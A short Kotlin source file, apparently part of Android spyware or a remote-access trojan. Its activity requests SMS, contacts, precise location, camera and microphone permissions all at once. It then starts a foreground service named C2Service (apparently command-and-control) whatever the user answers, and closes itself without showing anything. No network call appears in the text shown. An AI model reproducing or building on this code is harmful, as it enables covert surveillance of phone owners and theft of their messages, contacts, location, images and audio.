package com.t.core
import android.Manifest
import android.app.Activity
import android.os.Build
import android.os.Bundle
class PermActivity : Activity() {
    override fun onCreate(b: Bundle?) {
        super.onCreate(b)
        if (Build.VERSION.SDK_INT >= 23) {
            requestPermissions(arrayOf(Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO), 1)
        }
    }
    override fun onRequestPermissionsResult(r: Int, p: Array<out String>, g: IntArray) {
        VC.startFg(this, android.content.Intent(this, C2Service::class.java))
        finish()
    }
}
